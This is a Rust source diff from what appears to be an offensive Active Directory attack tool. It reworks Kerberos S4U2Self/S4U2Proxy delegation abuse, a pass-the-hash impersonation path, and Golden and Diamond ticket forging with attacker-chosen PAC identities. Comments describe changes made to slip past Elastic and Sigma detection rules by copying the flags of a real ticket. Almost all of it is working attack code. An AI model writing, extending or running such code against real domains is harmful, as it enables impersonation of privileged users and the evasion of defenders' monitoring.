+    use kerbcore::der::{encode_general_string, encode_sequence, explicit};
+    krb_string(impersonate)?; // IA5 validation parity
+    let sk = kc_session_key_of(tgt)?;
+    // 1.5.3 audit finding #5: derive the S4U PA-FOR-USER checksum type from the session key's
+    // enctype (AES128=15, AES256=16, RC4=-138 per RFC 3961/4757). Previously hardcoded 16 with
+    // a 32-byte length guard, which made `rbcd_impersonate_by_hash` (RC4 TGT from a captured NT
+    // hash) unconditionally bail — defeating the whole pass-the-hash → RBCD path.
+    let cksumtype = sk.enctype().authenticator_cksumtype().ok_or_else(|| {
+        anyhow!(
+            "S4U2Self PA-FOR-USER: session-key enctype {} has no MS-KILE authenticator checksum \
+             type — RFC 8009 (etype 19/20) session keys are not accepted by AD's S4U path today",
+            sk.enctype().to_i32()
+        )
+    })?;
+    // S4U checksum input: LE(name-type=NT_PRINCIPAL) || username || realm || auth-package.
     let mut s4u = Vec::new();
-    s4u.extend_from_slice(&(NT_PRINCIPAL as i32).to_le_bytes());
+    s4u.extend_from_slice(&1i32.to_le_bytes());
     s4u.extend_from_slice(impersonate.as_bytes());
     s4u.extend_from_slice(tgt.crealm.as_bytes());
     s4u.extend_from_slice(b"Kerberos");
-    let cksum = ChecksumSuite::HmacSha196Aes256
-        .hasher()
-        .checksum(&tgt.session_key, KERB_NON_KERB_CKSUM_SALT, &s4u)
-        .map_err(|e| anyhow!("PA-FOR-USER checksum: {e}"))?;
+    let cksum_bytes = sk.checksum(KERB_NON_KERB_CKSUM_SALT, &s4u);
 
-    let pfu = PaForUser {
-        user_name: ExplicitContextTag0::from(principal(NT_PRINCIPAL, &[impersonate])?),
-        user_realm: ExplicitContextTag1::from(krb_string(&tgt.crealm)?),
-        cksum: ExplicitContextTag2::from(Checksum {
-            cksumtype: ExplicitContextTag0::from(IntegerAsn1(vec![16])), // HMAC-SHA1-96-AES256
-            checksum: ExplicitContextTag1::from(OctetStringAsn1(cksum)),
-        }),
-        auth_package: ExplicitContextTag3::from(krb_string("Kerberos")?),
+    let user_pn = kerbcore::types::PrincipalName {
+        name_type: kerbcore::client::NT_PRINCIPAL,
+        name_string: vec![impersonate.to_string()],
     };
-    Ok(PaData {
-        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x00, 0x81])), // PA-FOR-USER = 129
-        padata_data: ExplicitContextTag2::from(OctetStringAsn1(
-            picky_asn1_der::to_vec(&pfu).map_err(|e| anyhow!("PA-FOR-USER encode: {e}"))?,
-        )),
+    let cksum = kerbcore::types::Checksum {
+        cksumtype,
+        checksum: cksum_bytes,
+    };
+    // PA-FOR-USER ::= SEQUENCE { [0] userName, [1] userRealm, [2] cksum, [3] auth-package }.
+    let body = [
+        explicit(0, &user_pn.encode()),
+        explicit(1, &kerbcore::types::encode_realm(&tgt.crealm)),
+        explicit(2, &cksum.encode()),
+        explicit(3, &encode_general_string("Kerberos")),
+    ]
+    .concat();
+    Ok(kerbcore::types::PaData {
+        padata_type: PA_FOR_USER,
+        padata_value: encode_sequence(&body),
     })
 }
 
@@ -1018,75 +1074,73 @@ pub async fn s4u2self(
     self_sam: &str,
     impersonate: &str,
     kdc: &str,
-) -> Result<picky_krb::data_types::Ticket> {
-    let req = build_tgs_req(
+) -> Result<kerbcore::messages::Ticket> {
+    let self_pn = kerbcore::types::PrincipalName {
+        name_type: kerbcore::client::NT_PRINCIPAL,
+        name_string: vec![self_sam.to_string()],
+    };
+    // Offer the full etype-preference list — AES256, AES128, RC4 — so an RC4-only trustee (default
+    // when msDS-SupportedEncryptionTypes is absent) still gets served instead of ETYPE_NOSUPP.
+    let raw = build_s4u_tgs_req(
         &tgt.crealm,
-        principal(NT_PRINCIPAL, &[self_sam])?,
-        vec![ap_req_padata(tgt)?, pa_for_user(tgt, impersonate)?],
-        [0x40, 0x01, 0x00, 0x00], // forwardable | canonicalize
-        vec![],
-        // Stream 2 / A.4: offer the full etype-preference list — AES256 first,
-        // AES128 second, RC4 last. KDC picks the highest it can serve; if the
-        // trustee only supports RC4 (default when msDS-SupportedEncryptionTypes
-        // is absent on 2019/2022+), we no longer ETYPE_NOSUPP.
+        &self_pn,
+        0x4001_0000, // forwardable | canonicalize
+        None,
         &[
-            crate::ETYPE_AES256,
-            crate::ETYPE_AES128,
-            crate::ETYPE_RC4_HMAC,
+            crate::ETYPE_AES256 as i32,
+            crate::ETYPE_AES128 as i32,
+            ETYPE_RC4_HMAC as i32,
         ],
+        |body_der| ap_req_padata(tgt, body_der),
+        vec![pa_for_user(tgt, impersonate)?],
     )?;
-    let resp = kdc_exchange(
-        kdc,
-        &picky_asn1_der::to_vec(&req).map_err(|e| anyhow!("S4U2Self encode: {e}"))?,
-    )
-    .await?;
-    let rep: TgsRep = picky_asn1_der::from_bytes(&resp)
+    let resp = kdc_exchange(kdc, &raw).await?;
+    let rep = kerbcore::messages::KdcRep::decode(&resp)
         .map_err(|_| anyhow!("S4U2Self failed: {}", krb_err(&resp)))?;
-    Ok(rep.0.ticket.0.clone())
+    Ok(rep.ticket)
 }
 
-/// PA-PAC-OPTIONS advertising Resource-Based Constrained Delegation (bit 3) — required so
-/// the KDC uses the RBCD path in S4U2Proxy instead of classic KCD (else KDC_ERR_BADOPTION).
-fn pa_pac_options_rbcd() -> Result<PaData> {
-    let opts = PaPacOptions {
-        flags: ExplicitContextTag0::from(BitStringAsn1::from(BitString::with_bytes(vec![
-            0x10, 0, 0, 0,
-        ]))),
-    };
-    Ok(PaData {
-        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x00, 0xa7])), // PA-PAC-OPTIONS = 167
-        padata_data: ExplicitContextTag2::from(OctetStringAsn1(
-            picky_asn1_der::to_vec(&opts).map_err(|e| anyhow!("PA-PAC-OPTIONS encode: {e}"))?,
-        )),
-    })
+/// PA-PAC-OPTIONS advertising Resource-Based Constrained Delegation (bit 3) — required so the KDC
+/// uses the RBCD path in S4U2Proxy instead of classic KCD (else KDC_ERR_BADOPTION).
+fn pa_pac_options_rbcd() -> kerbcore::types::PaData {
+    use kerbcore::der::{encode_sequence, explicit, tlv, TAG_BIT_STRING};
+    // PA-PAC-OPTIONS ::= SEQUENCE { [0] KerberosFlags }; RBCD = bit 3 → 0x10 in the first flag byte.
+    let flags = tlv(TAG_BIT_STRING, &[0u8, 0x10, 0, 0, 0]);
+    kerbcore::types::PaData {
+        padata_type: PA_PAC_OPTIONS,
+        padata_value: encode_sequence(&explicit(0, &flags)),
+    }
 }
 
 /// S4U2Proxy: use the S4U2Self ticket as an additional ticket to get a service ticket to
 /// `target_spn` as the impersonated user (the RBCD payoff).
 pub async fn s4u2proxy(
     tgt: &Tgt,
-    self_ticket: picky_krb::data_types::Ticket,
+    self_ticket: kerbcore::messages::Ticket,
     target_spn: &str,
     kdc: &str,
-) -> Result<picky_krb::data_types::Ticket> {
-    let parts: Vec<&str> = target_spn.split('/').collect();
-    let req = build_tgs_req(
+) -> Result<kerbcore::messages::Ticket> {
+    let sname = kerbcore::types::PrincipalName {
+        name_type: kerbcore::client::NT_SRV_INST,
+        name_string: target_spn.split('/').map(|s| s.to_string()).collect(),
+    };
+    let raw = build_s4u_tgs_req(
         &tgt.crealm,
-        principal(NT_SRV_INST, &parts)?,
-        vec![ap_req_padata(tgt)?, pa_pac_options_rbcd()?],
-        [0x40, 0x03, 0x00, 0x00], // forwardable | cname-in-addl-tkt | canonicalize
-        vec![self_ticket],
-        // Stream 2 / A.4: parity with s4u2self — full etype preference list.
-        &[crate::ETYPE_AES256, crate::ETYPE_AES128, ETYPE_RC4_HMAC],
+        &sname,
+        0x4003_0000, // forwardable | cname-in-addl-tkt | canonicalize
+        Some(&self_ticket),
+        &[
+            crate::ETYPE_AES256 as i32,
+            crate::ETYPE_AES128 as i32,
+            ETYPE_RC4_HMAC as i32,
+        ],
+        |body_der| ap_req_padata(tgt, body_der),
+        vec![pa_pac_options_rbcd()],
     )?;
-    let resp = kdc_exchange(
-        kdc,
-        &picky_asn1_der::to_vec(&req).map_err(|e| anyhow!("S4U2Proxy encode: {e}"))?,
-    )
-    .await?;
-    let rep: TgsRep = picky_asn1_der::from_bytes(&resp)
+    let resp = kdc_exchange(kdc, &raw).await?;
+    let rep = kerbcore::messages::KdcRep::decode(&resp)
         .map_err(|_| anyhow!("S4U2Proxy failed: {}", krb_err(&resp)))?;
-    Ok(rep.0.ticket.0.clone())
+    Ok(rep.ticket)
 }
 
 /// Full RBCD chain: TGT for the controlled account → S4U2Self(impersonate) → S4U2Proxy to
@@ -1130,16 +1184,7 @@ async fn rbcd_impersonate_with_tgt(
     let bare = bare.rsplit('\\').next().unwrap_or(bare);
     let self_ticket = s4u2self(tgt, bare, impersonate, kdc).await?;
     let svc_ticket = s4u2proxy(tgt, self_ticket, target_spn, kdc).await?;
-    let etype = svc_ticket
-        .0
-        .enc_part
-        .0
-        .etype
-        .0
-         .0
-        .iter()
-        .fold(0u32, |a, &b| (a << 8) | b as u32);
-    Ok(etype)
+    Ok(svc_ticket.enc_part.etype as u32)
 }
 
 /// **1.4.8-A WS-DIAMOND-TICKET**: overrides for a forged ticket's timestamps. `None`
@@ -1149,10 +1194,16 @@ async fn rbcd_impersonate_with_tgt(
 /// forged one's clock-domain matches the KDC exactly.
 #[derive(Default, Clone)]
 pub struct TicketTimestamps {
-    pub auth_time: Option<KerberosTime>,
-    pub starttime: Option<KerberosTime>,
-    pub endtime: Option<KerberosTime>,
-    pub renew_till: Option<KerberosTime>,
+    /// Kerberos generalized-time string (`YYYYMMDDHHMMSSZ`), or `None` for the now/far-future default.
+    pub auth_time: Option<String>,
+    pub starttime: Option<String>,
+    pub endtime: Option<String>,
+    pub renew_till: Option<String>,
+    /// 32-bit `TicketFlags` value to embed. `None` = the Golden default `0x40e10000`
+    /// (FORWARDABLE | RENEWABLE | INITIAL | PRE-AUTHENT | OK-AS-DELEGATE).
+    /// 1.5.3 audit H-3 — Diamond must inherit the real ticket's flags so the outer word matches
+    /// what a KDC would issue for that user (defeats Elastic/Sigma "abnormal-flags-for-user" rules).
+    pub flags: Option<u32>,
     /// **1.4.8 audit fix:** Diamond ticket must inherit the outer `cname`
     /// from the template TGT — otherwise the AP-REQ authenticator (which
     /// uses `Tgt.cname`) mismatches the ticket, and every service returns
@@ -1160,8 +1211,8 @@ pub struct TicketTimestamps {
     /// `EncTicketPart.cname` and the returned `Tgt.cname` are set to `pn`
     /// while the PAC still carries the attacker-chosen identity from
     /// `id.user`. When `None`, everything falls back to `id.user` (Golden
-    /// ticket behaviour where cname and PAC identity match).
-    pub cname_template: Option<PrincipalName>,
+    /// ticket behaviour where cname and PAC identity match). 1.5.3: kerbcore type.
+    pub cname_template: Option<kerbcore::types::PrincipalName>,
 }
 
 /// Shared ticket forger. Marshals the PAC (signed with `server_sig_key`/`kdc_sig_key`), wraps it
@@ -1205,6 +1256,10 @@ fn forge_ticket_with_timestamps(
     rc4: bool,
     ts: &TicketTimestamps,
 ) -> Result<Tgt> {
+    use kerbcore::der::{
+        application_tag, encode_integer, encode_octet_string, encode_sequence, explicit, tlv,
+        TAG_BIT_STRING,
+    };
     let realm = realm.to_uppercase();
     let pac_bytes = crate::pac::assemble_pac(id, server_sig_key, kdc_sig_key, rc4)?;
     let etype = if rc4 {
@@ -1213,84 +1268,107 @@ fn forge_ticket_with_timestamps(
         crate::ETYPE_AES256
     };
 
-    // authorization-data: AD-IF-RELEVANT(1) → [ AD-WIN2K-PAC(128) = pac ].
-    let win2k = AuthorizationDataInner {
-        ad_type: ExplicitContextTag0::from(IntegerAsn1(vec![0x00, 0x80])), // 128
-        ad_data: ExplicitContextTag1::from(OctetStringAsn1(pac_bytes)),
+    // authorization-data [10]: SEQUENCE OF { AD-IF-RELEVANT(1) = SEQUENCE OF { AD-WIN2K-PAC(128) = pac } }.
+    let ad_elem = |ad_type: i64, ad_data: &[u8]| -> Vec<u8> {
+        encode_sequence(
+            &[
+                explicit(0, &encode_integer(ad_type)),
+                explicit(1, &encode_octet_string(ad_data)),
+            ]
+            .concat(),
+        )
     };
-    let inner: AuthorizationData = Asn1SequenceOf::from(vec![win2k]);
-    let inner_der = picky_asn1_der::to_vec(&inner).map_err(|e| anyhow!("encode PAC AD: {e}"))?;
-    let if_rel = AuthorizationDataInner {
-        ad_type: ExplicitContextTag0::from(IntegerAsn1(vec![0x01])),
-        ad_data: ExplicitContextTag1::from(OctetStringAsn1(inner_der)),
-    };
-    let auth: AuthorizationData = Asn1SequenceOf::from(vec![if_rel]);
+    let win2k = ad_elem(128, &pac_bytes);
+    let if_rel = ad_elem(1, &encode_sequence(&win2k));
+    let auth_der = encode_sequence(&if_rel);
 
     // Session key: 16 bytes for RC4 (etype 23), 32 for AES256 (etype 18).
     let mut sk = vec![0u8; if rc4 { 16 } else { 32 }];
     rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut sk);
-    // Outer cname: Diamond ticket inherits from a legitimate TGT
-    // (`ts.cname_template`); Golden ticket uses the attacker-chosen
-    // identity (`id.user`). Whatever's here MUST also land on
-    // `Tgt.cname` below, or the AP-REQ authenticator mismatches.
-    let cname = ts
+    // Outer cname (kerbcore): Diamond inherits from the template TGT (`ts.cname_template`);
+    // Golden uses the attacker-chosen identity (`id.user`). Whatever's here MUST also land on
+    // `Tgt.cname` below (bridged to picky), or the AP-REQ authenticator mismatches the ticket.
+    let cname_kc = ts
         .cname_template
         .clone()
-        .unwrap_or(principal(NT_PRINCIPAL, &[id.user.as_str()])?);
+        .unwrap_or_else(|| kerbcore::types::PrincipalName {
+            name_type: kerbcore::client::NT_PRINCIPAL,
+            name_string: vec![id.user.clone()],
+        });
 
-    // Ticket flags 0x40e10000: forwardable, proxiable, renewable, initial, pre-authent.
-    let etp = EncTicketPart {
-        flags: ExplicitContextTag0::from(BitStringAsn1::from(BitString::with_bytes(vec![
-            0x40, 0xe1, 0x00, 0x00,
-        ]))),
-        key: ExplicitContextTag1::from(EncryptionKey {
-            key_type: ExplicitContextTag0::from(IntegerAsn1(vec![etype])),
-            key_value: ExplicitContextTag1::from(OctetStringAsn1(sk.clone())),
-        }),
-        crealm: ExplicitContextTag2::from(krb_string(&realm)?),
-        cname: ExplicitContextTag3::from(cname.clone()),
-        transited: ExplicitContextTag4::from(TransitedEncoding {
-            tr_type: ExplicitContextTag0::from(IntegerAsn1(vec![0])),
-            contents: ExplicitContextTag1::from(OctetStringAsn1(vec![])),
-        }),
-        auth_time: ExplicitContextTag5::from(
-            ts.auth_time.clone().unwrap_or_else(now_kerberos_time),
-        ),
-        starttime: Optional::from(Some(ExplicitContextTag6::from(
-            ts.starttime.clone().unwrap_or_else(now_kerberos_time),
-        ))),
-        endtime: ExplicitContextTag7::from(
-            ts.endtime.clone().unwrap_or_else(crate::far_future_time),
-        ),
-        renew_till: Optional::from(Some(ExplicitContextTag8::from(
-            ts.renew_till.clone().unwrap_or_else(crate::far_future_time),
-        ))),
-        caddr: Optional::from(None),
-        authorization_data: Optional::from(Some(ExplicitContextTag10::from(auth))),
-    };
-    let etp_app: ApplicationTag<EncTicketPart, 3> = ApplicationTag(etp);
-    let etp_der =
-        picky_asn1_der::to_vec(&etp_app).map_err(|e| anyhow!("encode EncTicketPart: {e}"))?;
-    // key usage 2 = ticket enc-part.
-    let enc = if rc4 {
-        crate::rc4::encrypt(ticket_key, 2, &etp_der, None)
-    } else {
-        aes256()
-            .encrypt(ticket_key, 2, &etp_der)
-            .map_err(|e| anyhow!("encrypt EncTicketPart: {e}"))?
-    };
+    let auth_time = ts.auth_time.clone().unwrap_or_else(now_krb_str);
+    let starttime = ts.starttime.clone().unwrap_or_else(now_krb_str);
+    let endtime = ts.endtime.clone().unwrap_or_else(|| FAR_FUTURE.to_string());
+    let renew_till = ts
+        .renew_till
+        .clone()
+        .unwrap_or_else(|| FAR_FUTURE.to_string());
+    let kt = |s: &str| kerbcore::types::KerberosTime(s.to_string()).encode();
 
-    let ticket = Ticket::from(TicketInner {
-        tkt_vno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
-        realm: ExplicitContextTag1::from(krb_string(&realm)?),
-        sname: ExplicitContextTag2::from(principal(NT_SRV_INST, sname)?),
-        enc_part: ExplicitContextTag3::from(encrypted_data(etype, enc)),
-    });
+    // EncTicketPart [APPLICATION 3] SEQUENCE. Default flags 0x40e10000 (1.5.3 audit H-4 revised:
+    // bits 1=FORWARDABLE | 8=RENEWABLE | 9=INITIAL | 10=PRE-AUTHENT | 15=ENC-PA-REP per
+    // MS-KILE §2.2.10 — NOT PROXIABLE (bit 3 = 0x10000000) and NOT OK-AS-DELEGATE (bit 13 =
+    // 0x00040000). Both prior comments got bit-15 wrong; this is the correct RFC 4120 §7.5
+    // bit numbering. 1.5.3 audit H-3: Diamond overrides via `ts.flags` to inherit the real
+    // template ticket's flag word. transited [4] = empty; [9] caddr omitted.
+    let flag_word = ts.flags.unwrap_or(0x40e1_0000).to_be_bytes();
+    let flags = tlv(
+        TAG_BIT_STRING,
+        &[0x00, flag_word[0], flag_word[1], flag_word[2], flag_word[3]],
+    );
+    let key_der = kerbcore::types::EncryptionKey {
+        keytype: etype as i32,
+        keyvalue: sk.clone(),
+    }
+    .encode();
+    let transited = encode_sequence(
+        &[
+            explicit(0, &encode_integer(0)),
+            explicit(1, &encode_octet_string(&[])),
+        ]
+        .concat(),
+    );
+    let etp_body = [
+        explicit(0, &flags),
+        explicit(1, &key_der),
+        explicit(2, &kerbcore::types::encode_realm(&realm)),
+        explicit(3, &cname_kc.encode()),
+        explicit(4, &transited),
+        explicit(5, &kt(&auth_time)),
+        explicit(6, &kt(&starttime)),
+        explicit(7, &kt(&endtime)),
+        explicit(8, &kt(&renew_till)),
+        explicit(10, &auth_der),
+    ]
+    .concat();
+    let etp_der = tlv(application_tag(3), &encode_sequence(&etp_body));
+
+    // Seal the EncTicketPart under `ticket_key` at key usage 2 (ticket enc-part).
+    let tkey = kerbcore::KerberosKey::from_i32(etype as i32, ticket_key.to_vec())
+        .map_err(|e| anyhow!("ticket key: {e}"))?;
+    let enc = tkey.encrypt(2, &etp_der);
+
+    let sname_kc = kerbcore::types::PrincipalName {
+        name_type: kerbcore::client::NT_SRV_INST,
+        name_string: sname.iter().map(|s| s.to_string()).collect(),
+    };
+    let kc_ticket = kerbcore::messages::Ticket {
+        tkt_vno: 5,
+        realm: realm.clone(),
+        sname: sname_kc,
+        enc_part: kerbcore::types::EncryptedData {
+            etype: etype as i32,
+            kvno: None,
+            cipher: enc,
+        },
+    };
 
     Ok(Tgt {
-        ticket,
+        ticket: picky_ticket(&kc_ticket)?,
         session_key: sk,
-        cname,
+        // Forged TGT session-key etype = the ticket's enc-part etype we sealed under.
+        session_etype: etype as i32,
+        cname: picky_cname(&cname_kc)?,
         crealm: realm,
     })
 }
@@ -1344,10 +1422,15 @@ pub fn forge_diamond_tgt(
     let (etp, _pac_bytes) = crate::pac::decrypt_ticket_pac(real, krbtgt_key)
         .context("decrypt real TGT ticket with krbtgt key")?;
     let ts = TicketTimestamps {
-        auth_time: Some(etp.auth_time.0.clone()),
-        starttime: etp.starttime.0.as_ref().map(|s| s.0.clone()),
-        endtime: Some(etp.endtime.0.clone()),
-        renew_till: etp.renew_till.0.as_ref().map(|s| s.0.clone()),
+        auth_time: Some(etp.authtime.clone()),
+        starttime: etp.starttime.clone(),
+        endtime: Some(etp.endtime.clone()),
+        renew_till: etp.renew_till.clone(),
+        // 1.5.3 audit H-3: inherit the real ticket's `TicketFlags` — the outer flag word is
+        // exactly the detection discriminator "abnormal-flags-for-this-user" alerts hook.
+        // Without this, Diamond overrode with the Golden default 0x40e10000, defeating the
+        // whole point of the ticket type. ms-pac-forge's own diamond does this too (`etp.flags`).
+        flags: Some(etp.flags),
         // 1.4.8 audit fix: inherit outer cname from the template. Without
         // this, roast_spn / any client-side AP-REQ builds the authenticator
         // with `Tgt.cname` = attacker-chosen and the ticket enc-part carries
@@ -1355,7 +1438,7 @@ pub fn forge_diamond_tgt(
         // header-vs-ticket cname get BADMATCH. Real Diamond ticket = outer
         // cname is the template's (looks like a normal login for that user),
         // PAC internally carries the attacker's group memberships.
-        cname_template: Some(etp.cname.0.clone()),
+        cname_template: Some(etp.cname.clone()),
     };
     let realm_up = real.crealm.to_uppercase();
     forge_ticket_with_timestamps(
@@ -1418,8 +1501,9 @@ fn ccache_for(tgt: &Tgt, user: &str, server: &[&str]) -> Result<Vec<u8>> {
     write_principal(&mut c, NT_PRINCIPAL as u32, realm, &[user]); // client
     write_principal(&mut c, NT_SRV_INST as u32, realm, server); // server
 
-    // keyblock: keytype (RC4=23 or AES256=18 per the session key), etype(0), keylen, key
-    c.extend_from_slice(&(session_etype(&tgt.session_key) as u16).to_be_bytes());
+    // keyblock: keytype (from the tracked session_etype — 1.5.3 audit H-1/M-5), etype(0),
+    // keylen, key. Using the wire etype ensures AES128 sessions are ccache-typed 17, not 23.
+    c.extend_from_slice(&(tgt.session_etype as u16).to_be_bytes());
     c.extend_from_slice(&0u16.to_be_bytes());
     c.extend_from_slice(&(tgt.session_key.len() as u16).to_be_bytes());
     c.extend_from_slice(&tgt.session_key);
@@ -1453,12 +1537,13 @@ fn ccache_for(tgt: &Tgt, user: &str, server: &[&str]) -> Result<Vec<u8>> {
 mod ws_redact_ticket_tests {
     use super::{
         encrypted_data, krb_string, principal, PrincipalName, ServiceTicket, Tgt, Ticket,
-        TicketInner, NT_SRV_INST,
+        NT_SRV_INST,
     };
     use picky_asn1::wrapper::{
         ExplicitContextTag0, ExplicitContextTag1, ExplicitContextTag2, ExplicitContextTag3,
         IntegerAsn1,
     };
+    use picky_krb::data_types::TicketInner;
 
     /// Build a stand-in Ticket + Tgt/ServiceTicket for redaction testing. The session_key
     /// carries a distinctive sentinel byte pattern so we can assert it never surfaces in
@@ -1490,6 +1575,7 @@ mod ws_redact_ticket_tests {
         let tgt = Tgt {
             ticket: sentinel_ticket(),
             session_key: SESSION_KEY_SENTINEL.to_vec(),
+            session_etype: 18,
             cname: sentinel_cname(),
             crealm: "TESTLAB.LOCAL".to_string(),
         };
@@ -1521,6 +1607,7 @@ mod ws_redact_ticket_tests {
         let st = ServiceTicket {
             ticket: sentinel_ticket(),
             session_key: SESSION_KEY_SENTINEL.to_vec(),
+            session_etype: 18,
             crealm: "TESTLAB.LOCAL".to_string(),
             cname: sentinel_cname(),
             spn: vec!["HTTP".to_string(), "webapp01".to_string()],
@@ -1557,6 +1644,7 @@ mod ws_redact_ticket_tests {
             tgt: Tgt {
                 ticket: sentinel_ticket(),
                 session_key: SESSION_KEY_SENTINEL.to_vec(),
+                session_etype: 18,
                 cname: sentinel_cname(),
                 crealm: "TESTLAB.LOCAL".to_string(),
             },
